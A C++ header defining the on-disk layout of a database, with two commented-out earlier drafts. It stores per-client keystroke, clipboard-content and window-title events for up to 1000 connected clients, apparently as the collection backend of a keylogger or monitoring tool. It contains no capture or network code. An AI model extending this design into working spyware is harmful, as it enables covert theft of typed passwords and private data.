// // #ifndef DB_STRUCTURES_HPP
// // #define DB_STRUCTURES_HPP

// // #include <cstdint>
// // #include <cstring>
// // #include <string>
// // #include <array>

// // using namespace std;

// // // File header for the unified database (256 bytes)
// // struct DatabaseHeader {
// //     uint32_t magic;                    // 0x4D454F57 "MEOW"
// //     uint32_t version;                  // 1
// //     uint64_t file_size;                // Pre-allocated 100MB
// //     uint64_t client_table_offset;      // Offset to client hash table
// //     uint64_t keystroke_tree_offset;    // Offset to keystroke B+ tree root
// //     uint64_t clipboard_tree_offset;    // Offset to clipboard B+ tree root
// //     uint64_t window_tree_offset;       // Offset to window B+ tree root
// //     uint32_t num_clients;              // Active client count
// //     uint32_t max_clients;              // 1000
// //     uint64_t next_free_offset;         // Next available space
// //     uint8_t padding[196];
    
// //     DatabaseHeader() {
// //         memset(this, 0, sizeof(*this));
// //         magic = 0x4D454F57;
// //         version = 1;
// //         file_size = 100ULL * 1024 * 1024; // 100MB
// //         max_clients = 1000;
// //     }
// // };

// // // Client record (256 bytes) - stored in hash table
// // struct ClientRecord {
// //     char client_id[64];                // Client identifier
// //     uint32_t client_hash;              // Hash of client_id
// //     uint8_t is_active;                 // Currently connected
// //     uint32_t session_count;            // Number of sessions
// //     uint64_t first_seen;               // First connection timestamp
// //     uint64_t last_seen;                // Last activity timestamp
    
// //     // Counters
// //     uint64_t total_keystrokes;
// //     uint64_t total_clipboard;
// //     uint64_t total_windows;
    
// //     // B+ tree offsets for this client's data
// //     uint64_t keystroke_tree_root;
// //     uint64_t clipboard_tree_root;
// //     uint64_t window_tree_root;
    
// //     uint8_t padding[96];
    
// //     ClientRecord() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     bool isEmpty() const {
// //         return client_id[0] == '\0';
// //     }
    
// //     void setClientId(const string& id) {
// //         strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
// //         client_hash = hashString(id);
// //     }
    
// //     static uint32_t hashString(const string& str) {
// //         uint32_t hash = 5381;
// //         for (char c : str) {
// //             hash = ((hash << 5) + hash) + c; // hash * 33 + c
// //         }
// //         return hash;
// //     }
// // };

// // // Keystroke event (64 bytes)
// // struct KeystrokeEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t sequence;
// //     char key[48];
    
// //     KeystrokeEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     KeystrokeEvent(uint64_t ts, uint32_t hash, uint32_t seq, const string& k) 
// //         : timestamp(ts), client_hash(hash), sequence(seq) {
// //         memset(key, 0, sizeof(key));
// //         strncpy(key, k.c_str(), sizeof(key) - 1);
// //     }
// // };

// // // Clipboard event (512 bytes)
// // struct ClipboardEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t content_length;
// //     char content[496];
    
// //     ClipboardEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     ClipboardEvent(uint64_t ts, uint32_t hash, const string& text) 
// //         : timestamp(ts), client_hash(hash) {
// //         content_length = min((size_t)496, text.size());
// //         memset(content, 0, sizeof(content));
// //         memcpy(content, text.c_str(), content_length);
// //     }
    
// //     string getContent() const {
// //         return string(content, content_length);
// //     }
// // };

// // // Window event (256 bytes)
// // struct WindowEvent {
// //     uint64_t timestamp;
// //     uint32_t client_hash;
// //     uint32_t padding1;
// //     char title[128];
// //     char process[112];
    
// //     WindowEvent() {
// //         memset(this, 0, sizeof(*this));
// //     }
    
// //     WindowEvent(uint64_t ts, uint32_t hash, const string& t, const string& p) 
// //         : timestamp(ts), client_hash(hash), padding1(0) {
// //         memset(title, 0, sizeof(title));
// //         memset(process, 0, sizeof(process));
// //         strncpy(title, t.c_str(), sizeof(title) - 1);
// //         strncpy(process, p.c_str(), sizeof(process) - 1);
// //     }
    
// //     string getTitle() const { return string(title); }
// //     string getProcess() const { return string(process); }
// // };

// // // B+ Tree Node (4096 bytes - page aligned)
// // static const int BPLUS_ORDER = 63;

// // struct BPlusTreeNode {
// //     bool is_leaf;
// //     uint32_t num_keys;
// //     uint32_t padding1;
// //     uint64_t keys[BPLUS_ORDER];              // Timestamps
// //     uint64_t children[BPLUS_ORDER + 1];      // Offsets
// //     uint64_t next_leaf;                      // For leaves
// //     uint64_t parent_offset;                  // Parent node
// //     uint8_t padding[24];
    
// //     BPlusTreeNode() {
// //         memset(this, 0, sizeof(*this));
// //     }
// // };

// // // Hash table slot (256 bytes)
// // struct HashTableSlot {
// //     ClientRecord client;
    
// //     HashTableSlot() {
// //         memset(this, 0, sizeof(*this));
// //     }
// // };

// // #endif


// #ifndef DB_STRUCTURES_HPP
// #define DB_STRUCTURES_HPP

// #include <cstdint>
// #include <cstring>
// #include <string>
// #include <array>

// using namespace std;

// #pragma pack(push, 1)

// // File header for the unified database (256 bytes)
// struct DatabaseHeader {
//     uint32_t magic;                    // 0x4D454F57 "MEOW"
//     uint32_t version;                  // 1
//     uint64_t file_size;                // Pre-allocated 100MB
//     uint64_t client_table_offset;      // Offset to client hash table
//     uint64_t keystroke_tree_offset;    // Offset to keystroke B+ tree root
//     uint64_t clipboard_tree_offset;    // Offset to clipboard B+ tree root
//     uint64_t window_tree_offset;       // Offset to window B+ tree root
//     uint32_t num_clients;              // Active client count
//     uint32_t max_clients;              // 1000
//     uint64_t next_free_offset;         // Next available space
//     uint8_t padding[196];
    
//     DatabaseHeader() {
//         memset(this, 0, sizeof(*this));
//         magic = 0x4D454F57;
//         version = 1;
//         file_size = 100ULL * 1024 * 1024; // 100MB
//         max_clients = 1000;
//     }
// };

// // Client record (256 bytes) - stored in hash table
// struct ClientRecord {
//     char client_id[64];                // Client identifier
//     uint32_t client_hash;              // Hash of client_id
//     uint8_t is_active;                 // Currently connected
//     uint32_t session_count;            // Number of sessions
//     uint64_t first_seen;               // First connection timestamp
//     uint64_t last_seen;                // Last activity timestamp
    
//     // Counters
//     uint64_t total_keystrokes;
//     uint64_t total_clipboard;
//     uint64_t total_windows;
    
//     // B+ tree offsets for this client's data
//     uint64_t keystroke_tree_root;
//     uint64_t clipboard_tree_root;
//     uint64_t window_tree_root;
    
//     uint8_t padding[96];
    
//     ClientRecord() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     bool isEmpty() const {
//         return client_id[0] == '\0';
//     }
    
//     void setClientId(const string& id) {
//         strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
//         client_hash = hashString(id);
//     }
    
//     static uint32_t hashString(const string& str) {
//         uint32_t hash = 5381;
//         for (char c : str) {
//             hash = ((hash << 5) + hash) + c; // hash * 33 + c
//         }
//         return hash;
//     }
// };

// // Keystroke event (64 bytes)
// struct KeystrokeEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t sequence;
//     char key[48];
    
//     KeystrokeEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     KeystrokeEvent(uint64_t ts, uint32_t hash, uint32_t seq, const string& k) 
//         : timestamp(ts), client_hash(hash), sequence(seq) {
//         memset(key, 0, sizeof(key));
//         strncpy(key, k.c_str(), sizeof(key) - 1);
//     }
// };

// // Clipboard event (512 bytes)
// struct ClipboardEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t content_length;
//     char content[496];
    
//     ClipboardEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     ClipboardEvent(uint64_t ts, uint32_t hash, const string& text) 
//         : timestamp(ts), client_hash(hash) {
//         content_length = min((size_t)496, text.size());
//         memset(content, 0, sizeof(content));
//         memcpy(content, text.c_str(), content_length);
//     }
    
//     string getContent() const {
//         return string(content, content_length);
//     }
// };

// // Window event (256 bytes)
// struct WindowEvent {
//     uint64_t timestamp;
//     uint32_t client_hash;
//     uint32_t padding1;
//     char title[128];
//     char process[112];
    
//     WindowEvent() {
//         memset(this, 0, sizeof(*this));
//     }
    
//     WindowEvent(uint64_t ts, uint32_t hash, const string& t, const string& p) 
//         : timestamp(ts), client_hash(hash), padding1(0) {
//         memset(title, 0, sizeof(title));
//         memset(process, 0, sizeof(process));
//         strncpy(title, t.c_str(), sizeof(title) - 1);
//         strncpy(process, p.c_str(), sizeof(process) - 1);
//     }
    
//     string getTitle() const { return string(title); }
//     string getProcess() const { return string(process); }
// };

// // B+ Tree Node (4096 bytes - page aligned)
// static const int BPLUS_ORDER = 63;

// struct BPlusTreeNode {
//     bool is_leaf;
//     uint32_t num_keys;
//     uint32_t padding1;
//     uint64_t keys[BPLUS_ORDER];              // Timestamps
//     uint64_t children[BPLUS_ORDER + 1];      // Offsets
//     uint64_t next_leaf;                      // For leaves
//     uint64_t parent_offset;                  // Parent node
//     uint8_t padding[24];
    
//     BPlusTreeNode() {
//         memset(this, 0, sizeof(*this));
//     }
// };

// // Hash table slot (256 bytes)
// struct HashTableSlot {
//     ClientRecord client;
    
//     HashTableSlot() {
//         memset(this, 0, sizeof(*this));
//     }
// };


// #pragma pack(pop)
// #endif






#ifndef DB_STRUCTURES_HPP
#define DB_STRUCTURES_HPP

#include <cstdint>
#include <cstring>
#include <string>
#include <algorithm>

using namespace std;

#pragma pack(push, 1) // EXACT binary layout, no compiler padding

// =============================================================
// DATABASE HEADER (256 BYTES EXACT)
// =============================================================
struct DatabaseHeader {
    uint32_t magic;                    // 4  : 'MEOW'
    uint32_t version;                  // 4
    uint64_t file_size;                // 8
    uint64_t client_table_offset;      // 8
    uint64_t keystroke_tree_offset;    // 8
    uint64_t clipboard_tree_offset;    // 8
    uint64_t window_tree_offset;       // 8
    uint32_t num_clients;              // 4
    uint32_t max_clients;              // 4
    uint64_t next_free_offset;         // 8
    uint8_t  padding[192];             // total = 256

    DatabaseHeader() {
        memset(this, 0, sizeof(*this));
        magic = 0x4D454F57; // 'MEOW'
        version = 1;
        file_size = 100ULL * 1024 * 1024;
        max_clients = 1000;
    }
};
static_assert(sizeof(DatabaseHeader) == 256, "DatabaseHeader must be 256 bytes");

// =============================================================
// CLIENT RECORD (256 BYTES EXACT)
// =============================================================
struct ClientRecord {
    char     client_id[64];
    uint32_t client_hash;
    uint8_t  is_active;
    uint8_t  padding1[3];
    uint32_t session_count;
    uint64_t first_seen;
    uint64_t last_seen;
    uint64_t total_keystrokes;
    uint64_t total_clipboard;
    uint64_t total_windows;
    uint64_t keystroke_tree_root;
    uint64_t clipboard_tree_root;
    uint64_t window_tree_root;
    uint8_t  padding2[116];             // total = 256

    ClientRecord() {
        memset(this, 0, sizeof(*this));
    }

    bool isEmpty() const {
        return client_id[0] == '\0';
    }

    static uint32_t hashString(const string& str) {
        uint32_t hash = 5381;
        for (char c : str) {
            hash = ((hash << 5) + hash) + (uint8_t)c;
        }
        return hash;
    }

    void setClientId(const string& id) {
        strncpy(client_id, id.c_str(), sizeof(client_id) - 1);
        client_id[sizeof(client_id) - 1] = '\0';
        client_hash = hashString(id);
    }
};
static_assert(sizeof(ClientRecord) == 256, "ClientRecord must be 256 bytes");

// =============================================================
// KEYSTROKE EVENT (64 BYTES EXACT)
// =============================================================
struct KeystrokeEvent {
    uint64_t timestamp;    // 8
    uint32_t client_hash;  // 4
    uint32_t sequence;     // 4
    char     key[48];      // 48

    KeystrokeEvent() {
        memset(this, 0, sizeof(*this));
    }

    KeystrokeEvent(uint64_t ts, uint32_t hash, const string& k)
        : timestamp(ts), client_hash(hash), sequence(0) {
        memset(key, 0, sizeof(key));
        strncpy(key, k.c_str(), sizeof(key) - 1);
    }
};
static_assert(sizeof(KeystrokeEvent) == 64, "KeystrokeEvent must be 64 bytes");

// =============================================================
// CLIPBOARD EVENT (512 BYTES EXACT)
// =============================================================
struct ClipboardEvent {
    uint64_t timestamp;        // 8
    uint32_t client_hash;      // 4
    uint32_t content_length;   // 4
    char     content[496];     // 496

    ClipboardEvent() {
        memset(this, 0, sizeof(*this));
    }

    ClipboardEvent(uint64_t ts, uint32_t hash, const string& text)
        : timestamp(ts), client_hash(hash) {
        content_length = min<size_t>(495, text.size());
        memset(content, 0, sizeof(content));
        memcpy(content, text.c_str(), content_length);
        content[content_length] = '\0';
    }
};
static_assert(sizeof(ClipboardEvent) == 512, "ClipboardEvent must be 512 bytes");

// =============================================================
// WINDOW EVENT (256 BYTES EXACT)
// =============================================================
struct WindowEvent {
    uint64_t timestamp;    // 8
    uint32_t client_hash;  // 4
    uint32_t padding1;     // 4
    char     title[128];   // 128
    char     process[112]; // 112

    WindowEvent() {
        memset(this, 0, sizeof(*this));
    }

    WindowEvent(uint64_t ts, uint32_t hash,
                const string& t, const string& p)
        : timestamp(ts), client_hash(hash), padding1(0) {
        memset(title, 0, sizeof(title));
        memset(process, 0, sizeof(process));
        strncpy(title, t.c_str(), sizeof(title) - 1);
        strncpy(process, p.c_str(), sizeof(process) - 1);
    }
};
static_assert(sizeof(WindowEvent) == 256, "WindowEvent must be 256 bytes");

// =============================================================
// B+ TREE NODE (4096 BYTES EXACT — DISK PAGE)
// =============================================================
static const int BPLUS_ORDER = 63;

struct BPlusTreeNode {
    bool     is_leaf;                      // 1
    uint8_t  padding1[3];                  // 3
    uint32_t num_keys;                     // 4
    uint64_t keys[BPLUS_ORDER];            // 504
    uint64_t children[BPLUS_ORDER + 1];    // 512
    uint64_t next_leaf;                    // 8
    uint64_t parent_offset;                // 8
    uint8_t  padding2[3056];               // total = 4096

    BPlusTreeNode() {
        memset(this, 0, sizeof(*this));
    }
};
static_assert(sizeof(BPlusTreeNode) == 4096, "BPlusTreeNode must be 4096 bytes");

// =============================================================
// HASH TABLE SLOT (256 BYTES EXACT)
// =============================================================
struct HashTableSlot {
    ClientRecord client;
};
static_assert(sizeof(HashTableSlot) == 256, "HashTableSlot must be 256 bytes");

#pragma pack(pop)

#endif // DB_STRUCTURES_HPP
